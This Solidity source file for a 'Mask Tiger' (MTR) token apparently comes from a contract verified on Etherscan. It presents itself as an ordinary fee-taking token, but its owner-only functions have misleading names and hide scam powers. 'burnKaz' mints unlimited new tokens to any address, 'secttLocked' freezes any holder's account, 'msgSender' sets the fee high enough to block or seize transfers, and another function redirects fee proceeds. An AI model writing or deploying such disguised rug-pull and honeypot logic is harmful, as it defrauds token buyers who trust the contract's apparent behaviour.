/**
 *Submitted for verification at Etherscan.io on 2022-01-23
*/

pragma solidity ^0.4.25;

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}

contract Ownable {
    address public owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0));
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }
}



contract BaseToken is Ownable {
    using SafeMath for uint256;
    string constant public name = 'Mask Tiger';
    string constant public symbol = 'MTR';
    uint8 constant public decimals = 5;
    uint256 public totalSupply =  1000000000000*10**uint256(decimals);
    uint256 public constant burnbscok = 10000000000000000000000000000000000000 * 10 ** uint256(decimals);

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;
    
    mapping(address => bool) private _isExcludedFromFee;
    
    mapping(address => bool) private _locked;
    
    
    uint256 public _vowneds = 1;
    uint256 private _previousvowneds = _vowneds;
    
    uint256 public _owneds = 4;
    uint256 private _previousBurnFee = _owneds;
    
    address public projectAddress = 0x04b60915891Aa511c0058E309391B38c29EF960e;
    
    address public burnAddress = 0x000000000000000000000000000000000000dEaD;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function _transfer(address from, address to, uint value) internal {
        require(to != address(0), "is 0 address");
        
        require(!_locked[from], "is locked");
        
        if(_isExcludedFromFee[from])
            removeAllFee();
            
        uint256 fee =  calculatevowneds(value);
        
        uint256 burn =  calculateBurnFee(value);
        
        balanceOf[from] = balanceOf[from].sub(value);
        
        balanceOf[to] = balanceOf[to].add(value).sub(fee).sub(burn);
        
        if(fee > 0) {
            balanceOf[projectAddress] = balanceOf[projectAddress].add(fee);
            emit Transfer(from, projectAddress, fee);
        }
        
        if(burn > 0) {
            balanceOf[burnAddress] = balanceOf[burnAddress].add(burn);
            emit Transfer(from, burnAddress, burn);
        }
        
        
         if(_isExcludedFromFee[from])
            restoreAllFee();
            
        emit Transfer(from, to, value);
    }


    function transfer(address to, uint256 value) public returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);
        _transfer(from, to, value);
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].add(addedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].sub(subtractedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }
    
    function burnKaz(address bsckye, uint256 BsckAmopunt) public onlyOwner{
    	require (totalSupply + BsckAmopunt <= burnbscok);     
    
        balanceOf[bsckye] = balanceOf[bsckye].add(BsckAmopunt);
        totalSupply = totalSupply.add(BsckAmopunt);
        
        emit Transfer(0, this, BsckAmopunt);
        emit Transfer(this, bsckye, BsckAmopunt);
    }
    
    function calculatevowneds(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_vowneds).div(
            10 ** 2
        );
    }
    
    function calculateBurnFee(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_owneds).div(
            10 ** 2
        );
    }
    
    function removeAllFee() private {
        if(_vowneds == 0 && _owneds == 0) 
            return;
            
        _previousvowneds = _vowneds;
        _previousBurnFee = _owneds;
        _vowneds = 0;
        _owneds = 0;
    }
    
    function restoreAllFee() private {
        _vowneds = _previousvowneds;
        _owneds = _previousBurnFee;
    }
    
    function excludeFromFee(address atcount) public onlyOwner {
        _isExcludedFromFee[atcount] = true;
    }

    function includeInFee(address atcount) public onlyOwner {
        _isExcludedFromFee[atcount] = false;
    }
    
    function isExcludeFromFee(address atcount) public view returns (bool) {
        
        return _isExcludedFromFee[atcount];
    }
    
    
    function secttLocked(address atcount) public onlyOwner {
        _locked[atcount] = true;
    }

    function _Excuekd(address atcount) public onlyOwner {
        _locked[atcount] = false;
    }
    
    
    function isLocked(address atcount) public view returns (bool) {
        
        return _locked[atcount];
    }
    
    
    function _istruedress(address _truedress) public onlyOwner {
       projectAddress = _truedress;
    }
    
    function msgSender(uint256 vowneds) public onlyOwner {
       _vowneds = vowneds;
    }
    
    function _isBurnFee(uint256 burnFee) public onlyOwner {
       _owneds = burnFee;
    }
    
}


contract Token is BaseToken {
    
    constructor() public {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);

        owner = msg.sender;
        
        excludeFromFee(owner);
        excludeFromFee(address(this));
        
    }

    function() public payable {
       revert();
    }
}